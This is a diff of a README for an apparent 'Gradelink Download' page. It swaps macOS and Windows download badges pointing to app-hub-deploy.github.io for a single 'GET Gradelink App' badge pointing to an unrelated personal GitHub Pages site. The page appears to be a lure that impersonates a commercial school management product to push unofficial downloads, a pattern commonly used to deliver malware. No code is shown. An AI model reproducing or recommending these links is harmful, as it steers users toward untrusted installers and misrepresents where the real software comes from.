@@ -1,18 +1,7 @@
 # Gradelink Download — School Management Platform
 
-<a href="https://app-hub-deploy.github.io/.github/?offer=Gradelink" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Gradelink%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="Gradelink for macOS">
-</a>
+[![GET Gradelink App](https://img.shields.io/badge/GET%20%E2%80%94%20Gradelink-App-0078D6?style=for-the-badge&logoColor=white)](https://ruthbakeri086.github.io/.github/Gradelink-App)
 
-<a href="https://app-hub-deploy.github.io/.github/?offer=Gradelink" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Gradelink%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="Gradelink for Windows">
-</a>
 
 ---
 
